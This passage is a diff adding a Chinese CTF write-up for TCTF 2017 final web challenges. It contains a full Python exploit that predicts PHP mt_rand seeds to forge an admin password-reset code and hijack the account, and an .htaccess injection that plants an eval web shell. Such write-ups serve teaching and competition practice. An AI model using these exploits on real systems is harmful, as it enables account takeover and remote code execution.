+        <span class="n">ckSavePass</span> <span class="o">=</span> <span class="n">cksavePass</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+
+        <span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span> <span class="c1"># new session</span>
+        <span class="n">sess</span><span class="o">.</span><span class="n">proxies</span> <span class="o">=</span> <span class="n">proxies</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;ckSavePass&#39;</span><span class="p">:</span><span class="n">ckSavePass</span><span class="p">},</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+        <span class="c1"># print len(r.content)</span>
+        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span> <span class="c1"># login failed</span>
+            <span class="k">print</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="k">else</span><span class="p">:</span>    <span class="c1"># login success, redirect to index.php</span>
+            <span class="k">print</span> <span class="mi">1</span><span class="p">,</span>
+            <span class="n">place_ascii</span> <span class="o">+=</span> <span class="n">power_num</span>
+
+    <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">place_ascii</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">flag</span>
+    <span class="n">offset</span> <span class="o">+=</span> <span class="mi">1</span>
+</pre></div>
+
+
+<h2>漏洞 2 预测 mt_rand() 重置 admin 密码</h2>
+<p>比赛过程中直接用漏洞1的代码攻击服务2，会出现500错误。代码已经被修改，必须用别的漏洞拿到admin的Cookie中的flag。<br>
+查看 reset.php，这个页面的功能是找回密码。填写注册时的邮箱，程序会发送邮件，内容是一串随机字符串。正确填写字符串就能重置密码。  </p>
+<h3>漏洞</h3>
+<p>值得注意的是对于所有的请求，都会类似的随机字符串csrftoken。按顺序，这些随机字符串是这样生成的：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="c1">// config.php</span>
+<span class="k">function</span> <span class="nf">gencsrftoken</span><span class="p">(</span><span class="nv">$length</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="nv">$chrs</span> <span class="o">=</span> <span class="s1">&#39;1234567890qwertyuiopasdfghjklzxcvbnm&#39;</span><span class="p">){</span>
+    <span class="nv">$csrf</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$csrf</span> <span class="o">.=</span> <span class="nv">$chrs</span><span class="p">{</span><span class="nb">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chrs</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)};</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$csrf</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$csrftoken</span> <span class="o">=</span> <span class="nx">gencsrftoken</span><span class="p">();</span>
+<span class="nb">setcookie</span><span class="p">(</span><span class="s1">&#39;csrftoken&#39;</span><span class="p">,</span> <span class="nv">$csrftoken</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span><span class="p">,</span> <span class="nv">$base_path</span><span class="p">);</span>
+
+<span class="c1">// user.class.php</span>
+<span class="k">function</span> <span class="nf">randomPass</span><span class="p">(</span><span class="nv">$length</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="nv">$chrs</span> <span class="o">=</span> <span class="s1">&#39;1234567890qwertyuiopasdfghjklzxcvbnm&#39;</span><span class="p">){</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$pwd</span> <span class="o">.=</span> <span class="nv">$chrs</span><span class="p">{</span><span class="nb">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chrs</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)};</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$pwd</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// reset.php</span>
+<span class="nv">$h</span> <span class="o">=</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">randomPass</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span>
+<span class="nv">$email</span> <span class="o">=</span> <span class="s1">&#39;Reset password code is: &#39;</span><span class="o">.</span><span class="nv">$h</span><span class="p">;</span>
+<span class="nb">mail</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">],</span> <span class="s1">&#39;Reset your password&#39;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
+</pre></div>
+
+
+<p>显然可以预测重置密码随机字符串。<br>
+这里还要拿出<a href="http://www.openwall.com/php_mt_seed/">php_mt_seed工具</a>。以前的使用方法是<code>./php_mt_seed 第一个随机数</code>，后来看了<a href="http://www.openwall.com/php_mt_seed/README">说明</a>才知道php_mt_seed 也可以用于<code>mt_rand($min, $max)</code>的场景。运行<code>./php_mt_seed 6 6 0 9  6 6 0 9  4 4 0 9</code>，参数4个一组，例如：7 8 0 9 表示 mt_rand(0, 9) 返回了 7-8。<br>
+然而在本地复现的时候，Apache 环境 mt_rand 播种之后似乎有了复用，在第一个随机数生成之前手动加入 mt_srand() 才能成功预测出种子。 </p>
+<h3>漏洞利用脚本</h3>
+<p>需要用到编译好的 php_mt_seed，stdbuf、php 命令，以及下面两个脚本</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">logging</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+
+<span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">,</span>
+                    <span class="n">format</span><span class="o">=</span><span class="s1">&#39;</span><span class="si">%(asctime)s</span><span class="s1"> [</span><span class="si">%(levelname)s</span><span class="s1">]:</span><span class="si">%(message)s</span><span class="s1">&#39;</span><span class="p">,</span>
+                    <span class="n">datefmt</span><span class="o">=</span><span class="s1">&#39;%H:%M:%S&#39;</span><span class="p">,</span>
+                    <span class="n">stream</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="p">)</span>
+
+<span class="n">admin_mail</span> <span class="o">=</span> <span class="s1">&#39;root@5alt.me&#39;</span>
+<span class="n">new_admin_password</span> <span class="o">=</span> <span class="s1">&#39;password&#39;</span>
+<span class="n">index_url</span> <span class="o">=</span> <span class="s1">&#39;http://WWW.EXAMPLE.COM/&#39;</span>
+<span class="n">reset_url</span> <span class="o">=</span> <span class="n">index_url</span> <span class="o">+</span> <span class="s1">&#39;reset.php&#39;</span>
+<span class="n">login_url</span> <span class="o">=</span> <span class="n">index_url</span> <span class="o">+</span> <span class="s1">&#39;login.php&#39;</span>
+<span class="n">chars</span> <span class="o">=</span> <span class="s1">&#39;1234567890qwertyuiopasdfghjklzxcvbnm&#39;</span>
+<span class="n">keygen_phpfile</span> <span class="o">=</span> <span class="s1">&#39;./random-cli.php&#39;</span>
+<span class="n">php_mt_seed_file</span> <span class="o">=</span> <span class="s1">&#39;./php_mt_seed&#39;</span>
+<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;http&#39;</span><span class="p">:</span><span class="s1">&#39;http://127.0.0.1:8080/&#39;</span><span class="p">}</span> <span class="c1"># brup suite for debug</span>
+<span class="n">success_str</span> <span class="o">=</span> <span class="s1">&#39;Password changed&#39;</span>
+<span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span>
+
+<span class="c1"># ------</span>
+<span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;checking environment and tools...&#39;</span><span class="p">)</span>
+<span class="n">ENV_OK</span> <span class="o">=</span> <span class="bp">True</span>
+<span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">access</span><span class="p">(</span><span class="n">php_mt_seed_file</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">X_OK</span><span class="p">):</span>
+    <span class="n">logging</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">%s</span><span class="s1"> not found&#39;</span><span class="p">,</span> <span class="n">php_mt_seed_file</span><span class="p">)</span>
+    <span class="n">ENV_OK</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">keygen_phpfile</span><span class="p">):</span>
+    <span class="n">logging</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">%s</span><span class="s1"> not found&#39;</span><span class="p">,</span> <span class="n">keygen_phpfile</span><span class="p">)</span>
+    <span class="n">ENV_OK</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="k">if</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;type php&#39;</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span><span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+    <span class="n">logging</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s1">&#39;php cli not found&#39;</span><span class="p">)</span>
+    <span class="n">ENV_OK</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">phpinfo</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s1">&#39;php&#39;</span><span class="p">,</span><span class="s1">&#39;-v&#39;</span><span class="p">])</span>
+    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;php found: </span><span class="si">%s</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">phpinfo</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">phpinfo</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)])</span>
+
+<span class="k">if</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;type stdbuf&#39;</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span><span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+    <span class="n">logging</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s1">&#39;stdbuf not found&#39;</span><span class="p">)</span>
+    <span class="n">ENV_OK</span> <span class="o">=</span> <span class="bp">False</span>
+
+<span class="k">if</span> <span class="ow">not</span> <span class="n">ENV_OK</span><span class="p">:</span>
+    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;exiting&#39;</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="c1"># ------</span>
+<span class="k">if</span> <span class="n">proxies</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="n">logging</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="s1">&#39;Proxy Enabled: </span><span class="si">%s</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">proxies</span><span class="p">))</span>
+
+<span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="n">sess</span><span class="o">.</span><span class="n">proxies</span> <span class="o">=</span> <span class="n">proxies</span>
+
+<span class="c1"># ------</span>
+<span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;target is </span><span class="si">%s</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">index_url</span><span class="p">)</span>
+<span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;testing url available...&#39;</span><span class="p">)</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">index_url</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s1">&#39;response code for </span><span class="si">%s</span><span class="s1"> is </span><span class="si">%d</span><span class="s1"> != 200&#39;</span><span class="p">,</span> <span class="n">index_url</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span><span class="n">e</span><span class="p">:</span>
+    <span class="n">logging</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s1">&#39;error </span><span class="si">%s</span><span class="s1"> </span><span class="si">%s</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">type</span><span class="p">(</span><span class="n">e</span><span class="p">)),</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1"># ------</span>
+<span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;sending reset password for </span><span class="si">%s</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">admin_mail</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">reset_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;email&#39;</span><span class="p">:</span><span class="n">admin_mail</span><span class="p">,</span><span class="s1">&#39;csrftoken&#39;</span><span class="p">:</span><span class="s1">&#39;abc&#39;</span><span class="p">},</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;csrftoken&#39;</span><span class="p">:</span><span class="s1">&#39;abc&#39;</span><span class="p">},</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">csrf_token</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">cookies</span><span class="p">[</span><span class="s1">&#39;csrftoken&#39;</span><span class="p">]</span>
+<span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;csrf token: </span><span class="si">%s</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">csrf_token</span><span class="p">)</span>
+
+<span class="c1"># ------</span>
+<span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;running php_mt_seed, please wait 5 min...&#39;</span><span class="p">)</span>
+<span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;stdbuf&#39;</span><span class="p">,</span><span class="s1">&#39;-i0&#39;</span><span class="p">,</span><span class="s1">&#39;-o0&#39;</span><span class="p">,</span><span class="s1">&#39;-e0&#39;</span><span class="p">,</span><span class="n">php_mt_seed_file</span><span class="p">,]</span> <span class="c1"># anti pipe buffering</span>
+<span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">csrf_token</span><span class="p">:</span>
+    <span class="n">offset</span> <span class="o">=</span> <span class="n">chars</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">+=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%d</span><span class="s1"> </span><span class="si">%d</span><span class="s1"> </span><span class="si">%d</span><span class="s1"> </span><span class="si">%d</span><span class="s1"> &#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">offset</span><span class="p">,</span><span class="n">offset</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">length</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+<span class="n">logging</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s1">&#39;php_mt_seed command: </span><span class="si">%s</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
+
+<span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">line</span> <span class="o">=</span> <span class="n">proc</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">line</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">:</span>    <span class="c1"># EOF</span>
+        <span class="k">break</span>
+    <span class="k">if</span> <span class="n">line</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;seed = &#39;</span><span class="p">):</span>
+        <span class="k">continue</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">seed</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()[</span><span class="mi">7</span><span class="p">:]</span>  <span class="c1"># seed = 16777230</span>
+        <span class="k">print</span> <span class="s1">&#39;&#39;</span>
+
+        <span class="c1"># generate verify code</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;get seed </span><span class="si">%s</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">seed</span><span class="p">)</span>
+        <span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;php&#39;</span><span class="p">,</span> <span class="n">keygen_phpfile</span><span class="p">,</span> <span class="n">seed</span><span class="p">]</span>
+        <span class="n">code</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;verify code is </span><span class="si">%s</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">reset_url</span><span class="p">,</span>
+                      <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;reset&#39;</span><span class="p">:</span><span class="n">code</span><span class="p">,</span><span class="s1">&#39;pwd&#39;</span><span class="p">:</span><span class="n">new_admin_password</span><span class="p">,</span><span class="s1">&#39;csrftoken&#39;</span><span class="p">:</span><span class="s1">&#39;abc&#39;</span><span class="p">},</span>
+                      <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;csrftoken&#39;</span><span class="p">:</span><span class="s1">&#39;abc&#39;</span><span class="p">})</span>
+        <span class="k">if</span> <span class="n">success_str</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
+            <span class="n">proc</span><span class="o">.</span><span class="n">terminate</span><span class="p">()</span>
+
+            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">success_str</span><span class="p">)</span>
+            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;new password for </span><span class="si">%s</span><span class="s1"> is </span><span class="si">%s</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">admin_mail</span><span class="p">,</span> <span class="n">new_admin_password</span><span class="p">)</span>
+            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;getting flag...&#39;</span><span class="p">)</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">login_url</span><span class="p">)</span>
+            <span class="n">csrf_token</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">cookies</span><span class="p">[</span><span class="s1">&#39;csrftoken&#39;</span><span class="p">]</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">login_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;uname&#39;</span><span class="p">:</span><span class="n">admin_mail</span><span class="p">,</span><span class="s1">&#39;pwd&#39;</span><span class="p">:</span><span class="n">new_admin_password</span><span class="p">,</span><span class="s1">&#39;csrftoken&#39;</span><span class="p">:</span><span class="n">csrf_token</span><span class="p">})</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">index_url</span><span class="p">)</span>
+            <span class="k">for</span> <span class="n">cookie</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">cookies</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">cookie</span><span class="o">.</span><span class="n">name</span> <span class="o">!=</span> <span class="s1">&#39;csrftoken&#39;</span><span class="p">:</span>
+                    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Cookie key </span><span class="si">%s</span><span class="s1"> value </span><span class="si">%s</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">cookie</span><span class="o">.</span><span class="n">name</span><span class="p">,</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote_plus</span><span class="p">(</span><span class="n">cookie</span><span class="o">.</span><span class="n">value</span><span class="p">))</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;code </span><span class="si">%s</span><span class="s1"> is wrong&#39;</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s1">&#39;&#39;</span>
+<span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;exiting&#39;</span><span class="p">)</span>
+</pre></div>
+
+
+<p>random-cli.php  </p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">randomPass</span><span class="p">(</span><span class="nv">$length</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="nv">$chrs</span> <span class="o">=</span> <span class="s1">&#39;1234567890qwertyuiopasdfghjklzxcvbnm&#39;</span><span class="p">){</span>
+    <span class="nv">$pwd</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$pwd</span> <span class="o">.=</span> <span class="nv">$chrs</span><span class="p">{</span><span class="nb">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chrs</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)};</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$pwd</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$argv</span><span class="p">)</span> <span class="o">===</span> <span class="mi">2</span><span class="p">){</span>
+    <span class="c1">// echo PHP_INT_SIZE;</span>
+    <span class="nv">$seed</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">version_compare</span><span class="p">(</span><span class="k">PHP_VERSION</span><span class="p">,</span> <span class="s1">&#39;7.1.0&#39;</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">){</span>
+        <span class="nb">mt_srand</span><span class="p">(</span><span class="nv">$seed</span><span class="p">,</span> <span class="nx">MT_RAND_PHP</span><span class="p">);</span>   
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nb">mt_srand</span><span class="p">(</span><span class="nv">$seed</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nv">$csrf_token</span> <span class="o">=</span> <span class="nx">randomPass</span><span class="p">();</span>
+    <span class="nv">$reset_code</span> <span class="o">=</span> <span class="nx">randomPass</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="nv">$reset_code</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<h1>Ocean Fish</h1>
+<p>这道题也是分两个flag。第一个flag提示<code>Flag1 is Admin's password</code>，做法详见<a href="http://www.melodia.pw/?p=902">TCTF 2017 FINAL WEB PARTIAL WRITEUP - Melody</a>。<br>
+拿到admin密码之后登进后台，可以执行任意MySQL、SQLite3的语句，也可以写入 .htaccess 来控制 url rewrite。</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="c1">// /application/controllers/Admin.php</span>
+<span class="k">public</span> <span class="k">function</span> <span class="nf">rewrite</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;rule&quot;</span><span class="p">]))</span>
+    <span class="p">{</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">&quot;/var/www/html/.htaccess&quot;</span><span class="p">,</span> <span class="s2">&quot;RewriteRule &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;rule&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nx">FILE_APPEND</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>显然可以用换行符对 .htaccess 进行注入。洒家把 .htaccess 设置为：  </p>
+<div class="highlight"><pre><span></span>RewriteRule ^abcd .index.php/abcd
+# &lt;?php eval($_GET[&#39;cmd&#39;]); ?&gt;
+php_value auto_prepend_file /var/www/html/.htaccess
+</pre></div>
+
+
+<p>这样运行任意.php文件都会首先包含这个 .htaccess，执行注释中的代码，从而 getshell。<br>
+本来想着已经能执行任意php代码了美滋滋，没想到后面还有大坑：服务器设置了disable_functions 和 open_basedir，并不知道怎么绕过。<br>
+另外拿到了一个 crackme.php:  </p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+    <span class="k">function</span> <span class="nf">ccc</span><span class="p">(</span><span class="nv">$uuu</span><span class="p">){</span>
+        <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nv">$user_input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;license&#39;</span><span class="p">];</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">ccc</span><span class="p">(</span><span class="nv">$user_input</span><span class="p">)){</span>
